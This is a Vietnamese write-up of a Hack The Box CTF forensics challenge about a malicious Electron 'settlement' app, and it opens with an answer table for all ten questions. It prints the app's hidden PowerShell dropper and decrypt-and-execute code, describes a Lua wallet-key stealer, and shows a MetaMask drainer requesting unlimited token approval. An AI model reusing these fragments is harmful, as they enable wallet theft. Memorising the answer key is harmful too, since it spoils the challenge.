# Holmes CTF 2026 - Sherlock 01: Silent Dividend
**Platform:** Hack The Box  
**Category:** DFIR / Malware Analysis / Smart Contract & Web3 Forensics  
**Tác giả phân tích:** Pair-programming with Antigravity  

---

## 1. Bảng tổng hợp câu hỏi & Đáp án (Sherlock Q&A)

| # | Câu hỏi | Định dạng yêu cầu | Đáp án chính xác |
| :---: | :--- | :---: | :--- |
| **1** | To which directory does the application copy the files bundled within the extraResources folder? | `(*:\path\to\dir)` | `C:\Users\Public` |
| **2** | Which Win32 structure defines the format of the buffer returned by the Lua script when monitoring directory changes? | `(string)` | `FILE_NOTIFY_INFORMATION` |
| **3** | Which Win32 API is used by the Lua script to send an HTTP request to the remote server? | `(string)` | `WinHttpSendRequest` |
| **4** | Which smart contract function does the Electron application invoke to retrieve the decryption key for the encrypted payload? | `(function())` | `resolveState()` |
| **5** | Investigate the smart contract using its address, analyze its logic, and recover the flag by decoding the encrypted data. | `(****=******** **********_*********=**-****)` | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| **6** | Which environment variable corresponds to the directory where the application copies the HTML file from its package? | `(string)` | `%TEMP%` |
| **7** | What token function does the HTML page call to request spending permission? | `(function())` | `approve()` |
| **8** | What is the exact token amount passed to the approval call? | `(number)` | `115792089237316195423570985008687907853269984665640564039457584007913129639935` |
| **9** | What ethers.js v6 provider class is used to connect to the browser wallet? | `(string)` | `BrowserProvider` |
| **10** | Analyze the HTML page to uncover a smart contract reference. Investigate the contract's logic and determine how to interact with it to recover the hidden flag. | `(**.****,*.****)` | `51.5049,0.0348` |

---

## 2. Bối cảnh đề bài (Scenario Overview)

* **Cốt truyện:** Bác sĩ John Watson mất tích sau khi điều tra các vụ tống tiền bí ẩn liên quan đến 3 nạn nhân (Martin Vale, Miriam Cross, Peter Rance). Các nạn nhân đều trải qua một quy trình: chuyển tiền tự nguyện thông qua một ứng dụng giải quyết tài chính mang tên **TrustSettle**, sau đó hoảng loạn và mất tích.
* **Mẫu vật điều tra:** File `danger.zip` (Password: `E9$LQ2@Mr7A!`) chứa:
  - `TrustSettle 1.0.0.exe` (~95 MB): Ứng dụng thanh toán mà nạn nhân cài đặt.
  - `README.md`: Hướng dẫn cấu hình ví tiền điện tử vào file `C:\Users\Public\.env`.
  - `Holmes CTF 2026 Sherlock 01.pdf`: Tài liệu cốt truyện điều tra.

---

## 3. Quá trình phân tích chi tiết (Step-by-Step Technical Analysis)

### Bước 1: Trích xuất tĩnh ứng dụng an toàn (Static Unpacking)

File thực thi `TrustSettle 1.0.0.exe` là một bộ cài đặt **NSIS** đóng gói ứng dụng **Electron**:
1. Sử dụng 7-Zip giải nén file NSIS thu được `$PLUGINSDIR\app-64.7z`.
2. Tiếp tục giải nén `app-64.7z` thu được:
   - `resources\app.asar`: Gói lưu trữ mã nguồn chính của ứng dụng Electron.
   - `extraResources\`: Chứa các file hỗ trợ gồm `luajit.exe`, `lua51.dll`, `api.txt`, `.env`.
   - `src\`: Giao diện ứng dụng gồm `index.html`, `renderer.js`, `settlement.html`.
3. Giải nén file `app.asar` bằng parser Python (hoặc `npx asar`) để thu được toàn bộ mã nguồn Node.js/JavaScript:
   - `package.json`
   - `main.js`
   - `preload.js`

---

### Bước 2: Phân tích `preload.js` - Hành vi Dropper & Gọi Smart Contract 1

Trong file `preload.js`:
```javascript
// Sao chép toàn bộ file từ extraResources sang C:\Users\Public
fs.readdirSync(path.resolve(`${process.resourcesPath}/../extraResources`))
  .forEach(f => fs.copyFileSync(
      path.resolve(`${process.resourcesPath}/../extraResources`, f),
      path.join('C:\\Users\\Public', f)
  ));

// Thực thi ngầm tập lệnh Lua qua Luajit
exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
```
👉 **Đáp án Câu 1:** `C:\Users\Public`

Tiếp tục phân tích logic tương tác blockchain trong `preload.js`:
```javascript
const CONTRACT_ADDRESS = '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
const RPC_URL = 'https://ethereum-sepolia-rpc.publicnode.com';
const CONTRACT_ABI = ['function resolveState() view returns (bytes32)'];
const ENCRYPTED_DATA = '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0';

async function initializeVault() {
    // Ghi file settlement.html ra thư mục cấp cao hơn (%TEMP%)
    const indexContent = fs.readFileSync(path.join(__dirname, 'src', 'settlement.html'), 'utf8');
    fs.writeFileSync(path.resolve(`${process.resourcesPath}/../../settlement.html`), indexContent, 'utf8');

    // Gọi hàm resolveState() trên smart contract
    const state = await contract.resolveState();

    // Dùng state làm key giải mã ENCRYPTED_DATA
    const decrypted = decryptEmbeddedData(ENCRYPTED_DATA, state);
    
    // Thực thi payload giải mã được
    exec(decrypted);
}
```
👉 **Đáp án Câu 4:** `resolveState()`

---

### Bước 3: Phân tích kịch bản Lua `api.txt` (Win32 Monitoring & C2)

File `api.txt` là một mã nguồn Lua đã bị xáo trộn (obfuscated) bằng Lua VM protector. Sử dụng kỹ thuật Hook / Tracing môi trường FFI (`ffi.cdef`, `ffi.load`) trong môi trường sandbox an toàn:
* Tập lệnh tải 2 thư viện DLL hệ thống: `kernel32.dll` và `winhttp.dll`.
* Theo dõi thư mục `C:\Users\Public\` để chờ nạn nhân nhập khóa ví vào `.env`:
  - Hàm gọi: `ReadDirectoryChangesW`
  - Cấu trúc buffer lưu kết quả: `FILE_NOTIFY_INFORMATION`
* Gửi dữ liệu ví đánh cắp được lên máy chủ từ xa thông qua Win32 API:
  - Hàm gọi: `WinHttpSendRequest`

👉 **Đáp án Câu 2:** `FILE_NOTIFY_INFORMATION`  
👉 **Đáp án Câu 3:** `WinHttpSendRequest`

---

### Bước 4: Giải mã Payload và Thu hồi Flag 1

Hàm `resolveState()` trên hợp đồng Sepolia (`0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1`) trả về giá trị:
```
0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

Thuật toán giải mã `decryptEmbeddedData()`:
1. `XOR` dữ liệu với từng byte của key.
2. Xoay bit sang trái 7 bit (`ROL 7`).
3. `XOR` với hằng số `0x42`.

Script Python thực hiện giải mã:
```python
encryptedData = bytes.fromhex('560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0')
key = bytes.fromhex('3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4')

res = bytearray(len(encryptedData))
for i in range(len(encryptedData)):
    step1 = encryptedData[i] ^ key[i % len(key)]
    step2 = ((step1 << 7) | (step1 >> 1)) & 0xff
    res[i] = step2 ^ 0x42

print(res.decode('utf-8'))
```
**Kết quả đầu ra:**
```cmd
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

👉 **Đáp án Câu 5:** `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`  
👉 **Đáp án Câu 6:** `%TEMP%`

---

### Bước 5: Phân tích Trang Lừa đảo `settlement.html` (Token Drainer)

Khi nạn nhân mở `settlement.html`:
```javascript
// Kết nối ví trình duyệt MetaMask
provider = new ethers.BrowserProvider(window.ethereum);
await provider.send("eth_requestAccounts", []);
signer = await provider.getSigner();

// Yêu cầu nạn nhân phê duyệt toàn bộ số dư token vô hạn
const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
const unlimitedAmount = ethers.MaxUint256;
const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
```
* **Hàm được gọi để xin quyền chi tiêu token:** `approve()`
* **Số lượng token yêu cầu duyệt:** `ethers.MaxUint256` $= 2^{256} - 1$:
  ```
  115792089237316195423570985008687907853269984665640564039457584007913129639935
  ```
* **Lớp provider trong ethers.js v6:** `BrowserProvider`

👉 **Đáp án Câu 7:** `approve()`  
👉 **Đáp án Câu 8:** `115792089237316195423570985008687907853269984665640564039457584007913129639935`  
👉 **Đáp án Câu 9:** `BrowserProvider`

---

### Bước 6: Phân tích Smart Contract `x0` & Thu hồi Tọa độ Ẩn (Flag 2)

Trong `settlement.html` tham chiếu tới contract rút tiền:
`X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D"`

Truy vấn mã nguồn đã xác minh (verified source) từ Blockscout Sepolia:
```solidity
contract x0 {
    bytes32 private x2 = 0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b;
    bytes32 private x3 = 0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01;
    bytes private x4; // chứa ciphertext cất giấu tọa độ/flag

    function x7() public view returns (address) {
        return address(uint160(uint256(x2) ^ uint256(x3)));
    }

    function x9(address x10) external view returns (string memory) {
        require(x10 == x7(), "not quite - keep analyzing");
        bytes memory decrypted = _crypt(x4, x10);
        return string(decrypted);
    }
}
```

1. Tính toán địa chỉ chủ sở hữu ẩn từ hàm `x7()`:
   $$\text{address} = \text{uint160}(\text{uint256}(x2) \oplus \text{uint256}(x3)) = \text{0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a}$$
2. Gọi hàm `x9(0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a)` trên mạng Sepolia.
3. Chuỗi trả về sau khi giải mã:
   ```
   51.5049,0.0348
   ```
   *(Đây là tọa độ GPS tại Luân Đôn, phù hợp hoàn toàn với định dạng `(**.****,*.****)` và cốt truyện của Sherlock Holmes).*

👉 **Đáp án Câu 10:** `51.5049,0.0348`

---
*Báo cáo được hoàn thành tự động thông qua quy trình trích xuất và phân tích tĩnh bảo mật.*
